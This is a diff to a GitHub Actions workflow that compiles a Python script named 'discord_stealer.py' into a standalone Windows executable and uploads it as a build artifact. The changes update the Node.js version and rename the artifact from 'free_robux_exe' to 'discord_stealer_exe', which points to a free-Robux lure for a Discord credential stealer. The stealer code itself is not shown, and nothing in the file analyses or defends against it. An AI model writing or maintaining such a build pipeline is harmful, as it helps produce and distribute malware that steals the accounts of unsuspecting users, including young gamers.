@@ -1,4 +1,4 @@
-name: Build Stealer EXE (Node.js 20)
+
 
 on:
   push:
@@ -14,10 +14,10 @@ jobs:
     - name: Checkout code
       uses: actions/checkout@v4
 
-    - name: Set up Node.js 20
+    - name: Set up Node.js 24
       uses: actions/setup-node@v4
       with:
-        node-version: '20'
+        node-version: '24'  # Updated to Node.js 24
 
     - name: Set up Python (for PyInstaller)
       uses: actions/setup-python@v5
@@ -35,11 +35,10 @@ jobs:
 
     - name: Build EXE with PyInstaller
       run: |
-        # PyInstaller is installed via Python, so we use pip run or call pyinstaller directly
         pyinstaller --onefile --name discord_stealer discord_stealer.py
 
     - name: Upload Artifact
       uses: actions/upload-artifact@v4
       with:
-        name: free_robux_exe
+        name: discord_stealer_exe
         path: dist/discord_stealer.exe
